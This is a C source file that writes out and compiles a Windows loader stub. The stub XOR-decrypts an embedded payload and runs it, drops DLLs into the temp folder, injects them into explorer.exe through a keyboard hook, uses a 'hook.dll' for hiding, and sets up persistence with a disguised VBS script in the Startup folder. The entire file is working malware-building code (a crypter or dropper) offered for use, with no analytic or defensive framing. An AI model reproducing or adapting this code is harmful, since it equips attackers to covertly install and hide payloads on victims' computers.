#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <tlhelp32.h>

int main(int argc, char *argv[]) {
    const char *output_path = "stub.exe";  // Default output path

    if (argc != 1) {
        fprintf(stderr, "Usage: %s\n", argv[0]);
        return 1;
    }

    // Generate stub_temp.c as a temporary file
    FILE *stub_file = fopen("stub_temp.c", "w");
    if (!stub_file) {
        fprintf(stderr, "Error: Could not create stub_temp.c\n");
        return 1;
    }

    fprintf(stub_file, "#include <windows.h>\n");
    fprintf(stub_file, "#include <stdio.h>\n");
    fprintf(stub_file, "#include <string.h>\n");
    fprintf(stub_file, "#include <tlhelp32.h>\n\n");

    fprintf(stub_file, "HHOOK g_hHook = NULL;\n");
    fprintf(stub_file, "HMODULE g_hDll = NULL;\n");
    fprintf(stub_file, "HMODULE g_hHookDll = NULL;\n\n");

    fprintf(stub_file, "void hex_to_bytes(const char *hex, unsigned char *bytes, size_t len) {\n");
    fprintf(stub_file, "    for (size_t i = 0; i < len; i++) {\n");
    fprintf(stub_file, "        sscanf(hex + 2 * i, \"%%2hhx\", &bytes[i]);\n");
    fprintf(stub_file, "    }\n");
    fprintf(stub_file, "}\n\n");

    fprintf(stub_file, "LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {\n");
    fprintf(stub_file, "    return CallNextHookEx(g_hHook, nCode, wParam, lParam);\n");
    fprintf(stub_file, "}\n\n");

    fprintf(stub_file, "DWORD WINAPI HookThread(LPVOID lpParam) {\n");
    fprintf(stub_file, "    MSG msg;\n");
    fprintf(stub_file, "    while (GetMessage(&msg, NULL, 0, 0)) {\n");
    fprintf(stub_file, "        TranslateMessage(&msg);\n");
    fprintf(stub_file, "        DispatchMessage(&msg);\n");
    fprintf(stub_file, "    }\n");
    fprintf(stub_file, "    return 0;\n");
    fprintf(stub_file, "}\n\n");

    fprintf(stub_file, "DWORD GetThreadIdForProcess(DWORD pid) {\n");
    fprintf(stub_file, "    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);\n");
    fprintf(stub_file, "    if (hSnapshot == INVALID_HANDLE_VALUE) {\n");
    fprintf(stub_file, "        return 0;\n");
    fprintf(stub_file, "    }\n");
    fprintf(stub_file, "    THREADENTRY32 te = { sizeof(te) };\n");
    fprintf(stub_file, "    Thread32First(hSnapshot, &te);\n");
    fprintf(stub_file, "    DWORD threadId = 0;\n");
    fprintf(stub_file, "    while (Thread32Next(hSnapshot, &te)) {\n");
    fprintf(stub_file, "        if (te.th32OwnerProcessID == pid) {\n");
    fprintf(stub_file, "            threadId = te.th32ThreadID;\n");
    fprintf(stub_file, "            break;\n");
    fprintf(stub_file, "        }\n");
    fprintf(stub_file, "    }\n");
    fprintf(stub_file, "    CloseHandle(hSnapshot);\n");
    fprintf(stub_file, "    return threadId;\n");
    fprintf(stub_file, "}\n\n");

    fprintf(stub_file, "DWORD GetExplorerPid() {\n");
    fprintf(stub_file, "    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);\n");
    fprintf(stub_file, "    if (hSnapshot == INVALID_HANDLE_VALUE) {\n");
    fprintf(stub_file, "        return 0;\n");
    fprintf(stub_file, "    }\n");
    fprintf(stub_file, "    PROCESSENTRY32 pe = { sizeof(pe) };\n");
    fprintf(stub_file, "    Process32First(hSnapshot, &pe);\n");
    fprintf(stub_file, "    DWORD pid = 0;\n");
    fprintf(stub_file, "    while (Process32Next(hSnapshot, &pe)) {\n");
    fprintf(stub_file, "        if (_stricmp(pe.szExeFile, \"explorer.exe\") == 0) {\n");
    fprintf(stub_file, "            pid = pe.th32ProcessID;\n");
    fprintf(stub_file, "            break;\n");
    fprintf(stub_file, "        }\n");
    fprintf(stub_file, "    }\n");
    fprintf(stub_file, "    CloseHandle(hSnapshot);\n");
    fprintf(stub_file, "    return pid;\n");
    fprintf(stub_file, "}\n\n");

    fprintf(stub_file, "void create_persistence(int enable_persistence) {\n");
    fprintf(stub_file, "    if (!enable_persistence) {\n");
    fprintf(stub_file, "        return;\n");
    fprintf(stub_file, "    }\n");
    fprintf(stub_file, "    char temp_dir[MAX_PATH];\n");
    fprintf(stub_file, "    GetTempPathA(MAX_PATH, temp_dir);\n");
    fprintf(stub_file, "    char hidden_folder[MAX_PATH];\n");
    fprintf(stub_file, "    snprintf(hidden_folder, MAX_PATH, \"%%s\\\\.%08lx\", temp_dir, GetTickCount());\n");
    fprintf(stub_file, "    CreateDirectoryA(hidden_folder, NULL);\n");
    fprintf(stub_file, "    char bin_path[MAX_PATH];\n");
    fprintf(stub_file, "    GetModuleFileNameA(NULL, bin_path, MAX_PATH);\n");
    fprintf(stub_file, "    char *bin_name = strrchr(bin_path, '\\\\') ? strrchr(bin_path, '\\\\') + 1 : bin_path;\n");
    fprintf(stub_file, "    char hidden_binary[MAX_PATH];\n");
    fprintf(stub_file, "    snprintf(hidden_binary, MAX_PATH, \"%%s\\\\%%s\", hidden_folder, bin_name);\n");
    fprintf(stub_file, "    CopyFileA(bin_path, hidden_binary, FALSE);\n");
    fprintf(stub_file, "    char appdata[MAX_PATH];\n");
    fprintf(stub_file, "    if (!GetEnvironmentVariableA(\"APPDATA\", appdata, MAX_PATH)) {\n");
    fprintf(stub_file, "        return;\n");
    fprintf(stub_file, "    }\n");
    fprintf(stub_file, "    char startup_folder[MAX_PATH];\n");
    fprintf(stub_file, "    snprintf(startup_folder, MAX_PATH, \"%%s\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\", appdata);\n");
    fprintf(stub_file, "    if (!CreateDirectoryA(startup_folder, NULL) && GetLastError() != ERROR_ALREADY_EXISTS) {\n");
    fprintf(stub_file, "        return;\n");
    fprintf(stub_file, "    }\n");
    fprintf(stub_file, "    char rand_str[9];\n");
    fprintf(stub_file, "    snprintf(rand_str, sizeof(rand_str), \"%%08lx\", GetTickCount());\n");
    fprintf(stub_file, "    char hidden_service[32];\n");
    fprintf(stub_file, "    snprintf(hidden_service, sizeof(hidden_service), \"SystemConfig-%%s\", rand_str);\n");
    fprintf(stub_file, "    char vbs_path[MAX_PATH];\n");
    fprintf(stub_file, "    snprintf(vbs_path, MAX_PATH, \"%%s\\\\%%s.vbs\", startup_folder, hidden_service);\n");
    fprintf(stub_file, "    char vbs_content[512];\n");
    fprintf(stub_file, "    snprintf(vbs_content, sizeof(vbs_content), \"Set WShell = CreateObject(\\\"WScript.Shell\\\")\\nWShell.Run \\\"\\\"\\\"%%s\\\"\\\"\\\", 0, False\\n\", hidden_binary);\n");
    fprintf(stub_file, "    HANDLE hFile = CreateFileA(vbs_path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);\n");
    fprintf(stub_file, "    if (hFile == INVALID_HANDLE_VALUE) {\n");
    fprintf(stub_file, "        return;\n");
    fprintf(stub_file, "    }\n");
    fprintf(stub_file, "    DWORD bytesWritten;\n");
    fprintf(stub_file, "    if (!WriteFile(hFile, vbs_content, strlen(vbs_content), &bytesWritten, NULL)) {\n");
    fprintf(stub_file, "        CloseHandle(hFile);\n");
    fprintf(stub_file, "        return;\n");
    fprintf(stub_file, "    }\n");
    fprintf(stub_file, "    CloseHandle(hFile);\n");
    fprintf(stub_file, "    char shortcut_path[MAX_PATH];\n");
    fprintf(stub_file, "    snprintf(shortcut_path, MAX_PATH, \"%%s\\\\%%s.lnk\", startup_folder, hidden_service);\n");
    fprintf(stub_file, "    char shortcut_content[512];\n");
    fprintf(stub_file, "    snprintf(shortcut_content, sizeof(shortcut_content), \"[InternetShortcut]\\nURL=file://%%s\\n\", vbs_path);\n");
    fprintf(stub_file, "    hFile = CreateFileA(shortcut_path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);\n");
    fprintf(stub_file, "    if (hFile == INVALID_HANDLE_VALUE) {\n");
    fprintf(stub_file, "        return;\n");
    fprintf(stub_file, "    }\n");
    fprintf(stub_file, "    if (!WriteFile(hFile, shortcut_content, strlen(shortcut_content), &bytesWritten, NULL)) {\n");
    fprintf(stub_file, "        CloseHandle(hFile);\n");
    fprintf(stub_file, "        return;\n");
    fprintf(stub_file, "    }\n");
    fprintf(stub_file, "    CloseHandle(hFile);\n");
    fprintf(stub_file, "}\n\n");

    fprintf(stub_file, "int main(int argc, char *argv[]) {\n");
    fprintf(stub_file, "    // Declare variables at the top for all paths\n");
    fprintf(stub_file, "    HRSRC hConfigRes = NULL;\n");
    fprintf(stub_file, "    HGLOBAL hConfigGlobal = NULL;\n");
    fprintf(stub_file, "    void *config_data = NULL;\n");
    fprintf(stub_file, "    DWORD config_size = 0;\n");
    fprintf(stub_file, "    HMODULE hDllModule = NULL;\n");
    fprintf(stub_file, "    HMODULE hHookDllModule = NULL;\n");
    fprintf(stub_file, "    char dll_path[MAX_PATH] = {0};\n");
    fprintf(stub_file, "    char hook_dll_path[MAX_PATH] = {0};\n\n");

    fprintf(stub_file, "    // Check if the CONFIG resource exists directly in stub.exe\n");
    fprintf(stub_file, "    HMODULE hModule = GetModuleHandle(NULL);\n");
    fprintf(stub_file, "    hConfigRes = FindResource(hModule, \"CONFIG\", \"PAYLOAD\");\n");
    fprintf(stub_file, "    if (hConfigRes) {\n");
    fprintf(stub_file, "        // CONFIG resource found directly in stub.exe (on-disk mode)\n");
    fprintf(stub_file, "        hConfigGlobal = LoadResource(hModule, hConfigRes);\n");
    fprintf(stub_file, "        if (!hConfigGlobal) {\n");
    fprintf(stub_file, "            return 1;\n");
    fprintf(stub_file, "        }\n");
    fprintf(stub_file, "        config_data = LockResource(hConfigGlobal);\n");
    fprintf(stub_file, "        if (!config_data) {\n");
    fprintf(stub_file, "            return 1;\n");
    fprintf(stub_file, "        }\n");
    fprintf(stub_file, "        config_size = SizeofResource(hModule, hConfigRes);\n");
    fprintf(stub_file, "        if (config_size == 0) {\n");
    fprintf(stub_file, "            return 1;\n");
    fprintf(stub_file, "        }\n");
    fprintf(stub_file, "    } else {\n");
    fprintf(stub_file, "        // First, load hook.dll to apply hiding hooks\n");
    fprintf(stub_file, "        HRSRC hHookDllRes = FindResource(hModule, \"HOOKDLL\", \"PAYLOAD\");\n");
    fprintf(stub_file, "        if (!hHookDllRes) {\n");
    fprintf(stub_file, "            return 1;\n");
    fprintf(stub_file, "        }\n");
    fprintf(stub_file, "        HGLOBAL hHookDllGlobal = LoadResource(hModule, hHookDllRes);\n");
    fprintf(stub_file, "        if (!hHookDllGlobal) {\n");
    fprintf(stub_file, "            return 1;\n");
    fprintf(stub_file, "        }\n");
    fprintf(stub_file, "        void *hook_dll_data = LockResource(hHookDllGlobal);\n");
    fprintf(stub_file, "        if (!hook_dll_data) {\n");
    fprintf(stub_file, "            return 1;\n");
    fprintf(stub_file, "        }\n");
    fprintf(stub_file, "        DWORD hook_dll_size = SizeofResource(hModule, hHookDllRes);\n");
    fprintf(stub_file, "        if (hook_dll_size == 0) {\n");
    fprintf(stub_file, "            return 1;\n");
    fprintf(stub_file, "        }\n\n");

    fprintf(stub_file, "        // Write hook.dll to a temporary file\n");
    fprintf(stub_file, "        char temp_path[MAX_PATH];\n");
    fprintf(stub_file, "        if (!GetTempPathA(MAX_PATH, temp_path)) {\n");
    fprintf(stub_file, "            return 1;\n");
    fprintf(stub_file, "        }\n");
    fprintf(stub_file, "        snprintf(hook_dll_path, MAX_PATH, \"%%s\\\\hook_%%lu.dll\", temp_path, GetTickCount());\n");
    fprintf(stub_file, "        HANDLE hFile = CreateFileA(hook_dll_path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);\n");
    fprintf(stub_file, "        if (hFile == INVALID_HANDLE_VALUE) {\n");
    fprintf(stub_file, "            return 1;\n");
    fprintf(stub_file, "        }\n");
    fprintf(stub_file, "        DWORD bytesWritten;\n");
    fprintf(stub_file, "        if (!WriteFile(hFile, hook_dll_data, hook_dll_size, &bytesWritten, NULL)) {\n");
    fprintf(stub_file, "            CloseHandle(hFile);\n");
    fprintf(stub_file, "            return 1;\n");
    fprintf(stub_file, "        }\n");
    fprintf(stub_file, "        CloseHandle(hFile);\n\n");

    fprintf(stub_file, "        // Load hook.dll\n");
    fprintf(stub_file, "        hHookDllModule = LoadLibraryA(hook_dll_path);\n");
    fprintf(stub_file, "        if (!hHookDllModule) {\n");
    fprintf(stub_file, "            DeleteFileA(hook_dll_path);\n");
    fprintf(stub_file, "            return 1;\n");
    fprintf(stub_file, "        }\n\n");

    fprintf(stub_file, "        // Now load the DLL resource (template.dll)\n");
    fprintf(stub_file, "        HRSRC hDllRes = FindResource(hModule, \"DLL\", \"PAYLOAD\");\n");
    fprintf(stub_file, "        if (!hDllRes) {\n");
    fprintf(stub_file, "            FreeLibrary(hHookDllModule);\n");
    fprintf(stub_file, "            DeleteFileA(hook_dll_path);\n");
    fprintf(stub_file, "            return 1;\n");
    fprintf(stub_file, "        }\n");
    fprintf(stub_file, "        HGLOBAL hDllGlobal = LoadResource(hModule, hDllRes);\n");
    fprintf(stub_file, "        if (!hDllGlobal) {\n");
    fprintf(stub_file, "            FreeLibrary(hHookDllModule);\n");
    fprintf(stub_file, "            DeleteFileA(hook_dll_path);\n");
    fprintf(stub_file, "            return 1;\n");
    fprintf(stub_file, "        }\n");
    fprintf(stub_file, "        void *dll_data = LockResource(hDllGlobal);\n");
    fprintf(stub_file, "        if (!dll_data) {\n");
    fprintf(stub_file, "            FreeLibrary(hHookDllModule);\n");
    fprintf(stub_file, "            DeleteFileA(hook_dll_path);\n");
    fprintf(stub_file, "            return 1;\n");
    fprintf(stub_file, "        }\n");
    fprintf(stub_file, "        DWORD dll_size = SizeofResource(hModule, hDllRes);\n");
    fprintf(stub_file, "        if (dll_size == 0) {\n");
    fprintf(stub_file, "            FreeLibrary(hHookDllModule);\n");
    fprintf(stub_file, "            DeleteFileA(hook_dll_path);\n");
    fprintf(stub_file, "            return 1;\n");
    fprintf(stub_file, "        }\n\n");

    fprintf(stub_file, "        // Write the DLL to a temporary file\n");
    fprintf(stub_file, "        snprintf(dll_path, MAX_PATH, \"%%s\\\\payload_%%lu.dll\", temp_path, GetTickCount());\n");
    fprintf(stub_file, "        hFile = CreateFileA(dll_path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);\n");
    fprintf(stub_file, "        if (hFile == INVALID_HANDLE_VALUE) {\n");
    fprintf(stub_file, "            FreeLibrary(hHookDllModule);\n");
    fprintf(stub_file, "            DeleteFileA(hook_dll_path);\n");
    fprintf(stub_file, "            return 1;\n");
    fprintf(stub_file, "        }\n");
    fprintf(stub_file, "        if (!WriteFile(hFile, dll_data, dll_size, &bytesWritten, NULL)) {\n");
    fprintf(stub_file, "            CloseHandle(hFile);\n");
    fprintf(stub_file, "            FreeLibrary(hHookDllModule);\n");
    fprintf(stub_file, "            DeleteFileA(hook_dll_path);\n");
    fprintf(stub_file, "            return 1;\n");
    fprintf(stub_file, "        }\n");
    fprintf(stub_file, "        CloseHandle(hFile);\n\n");

    fprintf(stub_file, "        // Load the DLL\n");
    fprintf(stub_file, "        hDllModule = LoadLibraryA(dll_path);\n");
    fprintf(stub_file, "        if (!hDllModule) {\n");
    fprintf(stub_file, "            DeleteFileA(dll_path);\n");
    fprintf(stub_file, "            FreeLibrary(hHookDllModule);\n");
    fprintf(stub_file, "            DeleteFileA(hook_dll_path);\n");
    fprintf(stub_file, "            return 1;\n");
    fprintf(stub_file, "        }\n\n");

    fprintf(stub_file, "        // Now load the CONFIG resource from the DLL\n");
    fprintf(stub_file, "        hConfigRes = FindResource(hDllModule, \"CONFIG\", \"PAYLOAD\");\n");
    fprintf(stub_file, "        if (!hConfigRes) {\n");
    fprintf(stub_file, "            FreeLibrary(hDllModule);\n");
    fprintf(stub_file, "            DeleteFileA(dll_path);\n");
    fprintf(stub_file, "            FreeLibrary(hHookDllModule);\n");
    fprintf(stub_file, "            DeleteFileA(hook_dll_path);\n");
    fprintf(stub_file, "            return 1;\n");
    fprintf(stub_file, "        }\n");
    fprintf(stub_file, "        hConfigGlobal = LoadResource(hDllModule, hConfigRes);\n");
    fprintf(stub_file, "        if (!hConfigGlobal) {\n");
    fprintf(stub_file, "            FreeLibrary(hDllModule);\n");
    fprintf(stub_file, "            DeleteFileA(dll_path);\n");
    fprintf(stub_file, "            FreeLibrary(hHookDllModule);\n");
    fprintf(stub_file, "            DeleteFileA(hook_dll_path);\n");
    fprintf(stub_file, "            return 1;\n");
    fprintf(stub_file, "        }\n");
    fprintf(stub_file, "        config_data = LockResource(hConfigGlobal);\n");
    fprintf(stub_file, "        if (!config_data) {\n");
    fprintf(stub_file, "            FreeLibrary(hDllModule);\n");
    fprintf(stub_file, "            DeleteFileA(dll_path);\n");
    fprintf(stub_file, "            FreeLibrary(hHookDllModule);\n");
    fprintf(stub_file, "            DeleteFileA(hook_dll_path);\n");
    fprintf(stub_file, "            return 1;\n");
    fprintf(stub_file, "        }\n");
    fprintf(stub_file, "        config_size = SizeofResource(hDllModule, hConfigRes);\n");
    fprintf(stub_file, "        if (config_size == 0) {\n");
    fprintf(stub_file, "            FreeLibrary(hDllModule);\n");
    fprintf(stub_file, "            DeleteFileA(dll_path);\n");
    fprintf(stub_file, "            FreeLibrary(hHookDllModule);\n");
    fprintf(stub_file, "            DeleteFileA(hook_dll_path);\n");
    fprintf(stub_file, "            return 1;\n");
    fprintf(stub_file, "        }\n");
    fprintf(stub_file, "    }\n\n");

    fprintf(stub_file, "    // Parse the PayloadConfig structure\n");
    fprintf(stub_file, "    typedef struct {\n");
    fprintf(stub_file, "        char key_hex[65];\n");
    fprintf(stub_file, "        unsigned char persistence;\n");
    fprintf(stub_file, "        unsigned int junk_url_count;\n");
    fprintf(stub_file, "        unsigned long long payload_size;\n");
    fprintf(stub_file, "        unsigned char load_in_memory;\n");
    fprintf(stub_file, "        unsigned char payload_data[1];\n");
    fprintf(stub_file, "    } PayloadConfig;\n");
    fprintf(stub_file, "    PayloadConfig *config = (PayloadConfig *)config_data;\n");
    fprintf(stub_file, "    int enable_persistence = (config->persistence == 1);\n");
    fprintf(stub_file, "    int load_in_memory = (config->load_in_memory == 1);\n");
    fprintf(stub_file, "    unsigned long long payload_size = config->payload_size;\n");
    fprintf(stub_file, "    unsigned char *encrypted_payload = config->payload_data;\n\n");

    fprintf(stub_file, "    // Create persistence if enabled\n");
    fprintf(stub_file, "    create_persistence(enable_persistence);\n\n");

    fprintf(stub_file, "    if (!load_in_memory) {\n");
    fprintf(stub_file, "        // Decrypt the payload\n");
    fprintf(stub_file, "        unsigned char key[32];\n");
    fprintf(stub_file, "        hex_to_bytes(config->key_hex, key, 32);\n");
    fprintf(stub_file, "        unsigned char *decrypted_payload = malloc(payload_size);\n");
    fprintf(stub_file, "        if (!decrypted_payload) {\n");
    fprintf(stub_file, "            if (hDllModule) FreeLibrary(hDllModule);\n");
    fprintf(stub_file, "            return 1;\n");
    fprintf(stub_file, "        }\n");
    fprintf(stub_file, "        memcpy(decrypted_payload, encrypted_payload, payload_size);\n");
    fprintf(stub_file, "        for (unsigned long long i = 0; i < payload_size; i++) {\n");
    fprintf(stub_file, "            decrypted_payload[i] ^= key[i %% 32];\n");
    fprintf(stub_file, "        }\n\n");

    fprintf(stub_file, "        // Write decrypted payload to disk\n");
    fprintf(stub_file, "        char bin_path[MAX_PATH];\n");
    fprintf(stub_file, "        GetModuleFileNameA(NULL, bin_path, MAX_PATH);\n");
    fprintf(stub_file, "        char *bin_name = strrchr(bin_path, '\\\\') ? strrchr(bin_path, '\\\\') + 1 : bin_path;\n");
    fprintf(stub_file, "        char decrypted_path[MAX_PATH];\n");
    fprintf(stub_file, "        snprintf(decrypted_path, MAX_PATH, \"decrypted_%%s\", bin_name);\n");
    fprintf(stub_file, "        HANDLE hFile = CreateFileA(decrypted_path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);\n");
    fprintf(stub_file, "        if (hFile == INVALID_HANDLE_VALUE) {\n");
    fprintf(stub_file, "            free(decrypted_payload);\n");
    fprintf(stub_file, "            if (hDllModule) FreeLibrary(hDllModule);\n");
    fprintf(stub_file, "            return 1;\n");
    fprintf(stub_file, "        }\n");
    fprintf(stub_file, "        DWORD bytesWritten;\n");
    fprintf(stub_file, "        if (!WriteFile(hFile, decrypted_payload, (DWORD)payload_size, &bytesWritten, NULL)) {\n");
    fprintf(stub_file, "            CloseHandle(hFile);\n");
    fprintf(stub_file, "            free(decrypted_payload);\n");
    fprintf(stub_file, "            if (hDllModule) FreeLibrary(hDllModule);\n");
    fprintf(stub_file, "            return 1;\n");
    fprintf(stub_file, "        }\n");
    fprintf(stub_file, "        CloseHandle(hFile);\n\n");

    fprintf(stub_file, "        // Execute the decrypted payload\n");
    fprintf(stub_file, "        STARTUPINFOA si = { sizeof(si) };\n");
    fprintf(stub_file, "        PROCESS_INFORMATION pi;\n");
    fprintf(stub_file, "        if (!CreateProcessA(decrypted_path, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {\n");
    fprintf(stub_file, "            free(decrypted_payload);\n");
    fprintf(stub_file, "            DeleteFileA(decrypted_path);\n");
    fprintf(stub_file, "            if (hDllModule) FreeLibrary(hDllModule);\n");
    fprintf(stub_file, "            return 1;\n");
    fprintf(stub_file, "        }\n");
    fprintf(stub_file, "        CloseHandle(pi.hProcess);\n");
    fprintf(stub_file, "        CloseHandle(pi.hThread);\n");
    fprintf(stub_file, "        free(decrypted_payload);\n");
    fprintf(stub_file, "        DeleteFileA(decrypted_path);\n");
    fprintf(stub_file, "        if (hDllModule) FreeLibrary(hDllModule);\n");
    fprintf(stub_file, "        return 0;\n");
    fprintf(stub_file, "    }\n\n");

    fprintf(stub_file, "    // For in-memory execution, the DLLs are already loaded as hDllModule and hHookDllModule\n");
    fprintf(stub_file, "    g_hDll = hDllModule;\n");
    fprintf(stub_file, "    g_hHookDll = hHookDllModule;\n\n");

    fprintf(stub_file, "    // Find explorer.exe PID\n");
    fprintf(stub_file, "    DWORD target_pid = GetExplorerPid();\n");
    fprintf(stub_file, "    if (target_pid == 0) {\n");
    fprintf(stub_file, "        FreeLibrary(g_hHookDll);\n");
    fprintf(stub_file, "        DeleteFileA(hook_dll_path);\n");
    fprintf(stub_file, "        FreeLibrary(g_hDll);\n");
    fprintf(stub_file, "        DeleteFileA(dll_path);\n");
    fprintf(stub_file, "        return 1;\n");
    fprintf(stub_file, "    }\n\n");

    fprintf(stub_file, "    // Find a thread ID in the target process\n");
    fprintf(stub_file, "    DWORD threadId = GetThreadIdForProcess(target_pid);\n");
    fprintf(stub_file, "    if (threadId == 0) {\n");
    fprintf(stub_file, "        FreeLibrary(g_hHookDll);\n");
    fprintf(stub_file, "        DeleteFileA(hook_dll_path);\n");
    fprintf(stub_file, "        FreeLibrary(g_hDll);\n");
    fprintf(stub_file, "        DeleteFileA(dll_path);\n");
    fprintf(stub_file, "        return 1;\n");
    fprintf(stub_file, "    }\n\n");

    fprintf(stub_file, "    // Set the hook to inject the DLLs\n");
    fprintf(stub_file, "    HOOKPROC hookProc = (HOOKPROC)GetProcAddress(g_hDll, \"_KeyboardProc@12\");\n");
    fprintf(stub_file, "    g_hHook = SetWindowsHookExA(WH_KEYBOARD, hookProc ? hookProc : KeyboardProc, g_hDll, threadId);\n");
    fprintf(stub_file, "    if (!g_hHook) {\n");
    fprintf(stub_file, "        FreeLibrary(g_hHookDll);\n");
    fprintf(stub_file, "        DeleteFileA(hook_dll_path);\n");
    fprintf(stub_file, "        FreeLibrary(g_hDll);\n");
    fprintf(stub_file, "        DeleteFileA(dll_path);\n");
    fprintf(stub_file, "        return 1;\n");
    fprintf(stub_file, "    }\n\n");

    fprintf(stub_file, "    // Create a thread to handle the hook\n");
    fprintf(stub_file, "    HANDLE hThread = CreateThread(NULL, 0, HookThread, NULL, 0, NULL);\n");
    fprintf(stub_file, "    if (!hThread) {\n");
    fprintf(stub_file, "        UnhookWindowsHookEx(g_hHook);\n");
    fprintf(stub_file, "        FreeLibrary(g_hHookDll);\n");
    fprintf(stub_file, "        DeleteFileA(hook_dll_path);\n");
    fprintf(stub_file, "        FreeLibrary(g_hDll);\n");
    fprintf(stub_file, "        DeleteFileA(dll_path);\n");
    fprintf(stub_file, "        return 1;\n");
    fprintf(stub_file, "    }\n\n");

    fprintf(stub_file, "    // Simulate a keyboard event to trigger the hook\n");
    fprintf(stub_file, "    keybd_event(VK_CONTROL, 0, 0, 0);\n");
    fprintf(stub_file, "    keybd_event(VK_CONTROL, 0, KEYEVENTF_KEYUP, 0);\n\n");

    fprintf(stub_file, "    // Wait for 10 seconds to allow the DLLs to execute\n");
    fprintf(stub_file, "    Sleep(10000);\n\n");

    fprintf(stub_file, "    // Cleanup\n");
    fprintf(stub_file, "    UnhookWindowsHookEx(g_hHook);\n");
    fprintf(stub_file, "    WaitForSingleObject(hThread, INFINITE);\n");
    fprintf(stub_file, "    CloseHandle(hThread);\n");
    fprintf(stub_file, "    FreeLibrary(g_hHookDll);\n");
    fprintf(stub_file, "    if (hook_dll_path[0] != '\\0' && !DeleteFileA(hook_dll_path)) {\n");
    fprintf(stub_file, "    }\n");
    fprintf(stub_file, "    FreeLibrary(g_hDll);\n");
    fprintf(stub_file, "    if (dll_path[0] != '\\0' && !DeleteFileA(dll_path)) {\n");
    fprintf(stub_file, "    }\n");
    fprintf(stub_file, "    return 0;\n");
    fprintf(stub_file, "}\n");

    fclose(stub_file);

    // Compile stub_temp.c into stub.exe
    char compile_cmd[512];
    snprintf(compile_cmd, sizeof(compile_cmd), "x86_64-w64-mingw32-gcc -o %s stub_temp.c -mwindows", output_path);
    int compile_result = system(compile_cmd);
    if (compile_result != 0) {
        fprintf(stderr, "Error: Failed to compile stub_temp.c\n");
        remove("stub_temp.c");
        return 1;
    }

    // Clean up
    remove("stub_temp.c");

    printf("Stub generated successfully: %s\n", output_path);
    return 0;
}